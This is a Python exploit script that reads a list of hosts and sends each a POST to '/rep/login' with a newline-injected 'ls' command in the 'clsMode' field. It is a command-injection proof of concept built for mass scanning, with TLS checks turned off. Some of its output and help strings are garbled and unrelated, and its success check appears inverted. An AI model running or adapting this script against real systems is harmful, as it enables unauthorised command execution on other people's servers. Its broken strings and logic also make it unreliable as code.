import requests
from optparse import OptionParser
import urllib3

urllib3.disable_warnings()


def readhttp(filename):
    f = open(filename, "r+", encoding="utf-8")
    lines = f.readlines()
    f.close()
    return lines


def requestspoc(filename, payload):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Te': 'trailers',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '118'
    }
    payload = "ls"
    data = 'clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123'
    lines = readhttp(filename)
    print("检测结果:")
    for line in lines:
        line = line.replace("\n", "")
        flag = "https" in line
        if flag:
            url = line + "/rep/login"
        else:
            url = "http://" + line + "/rep/login"

        try:
            response = requests.post(url, verify=False, headers=headers, data=data, timeout=(1.0, 4.0))
            res = "cls_mode_login%0Als%0A" in response.text
            if res == False:
                print('[+]' + url + '   ==>   ' + "API-CT SYS FAIL LIST 19]内部主键ID耗尽 | cluster mode othersaclog")
            else:
                print('[-]' + url + '   ==>   ' + response.text)
        except:
            pass


if __name__ == '__main__':
    parser = OptionParser()
    parser.add_option("-t", "--txt", action="store", dest="text", default='', type="string",
                      help="Mode has generate disable encryption and blasting encryption key [generate/blasting]")
    (options, args) = parser.parse_args()
    requestspoc(filename=options.text, payload=None)
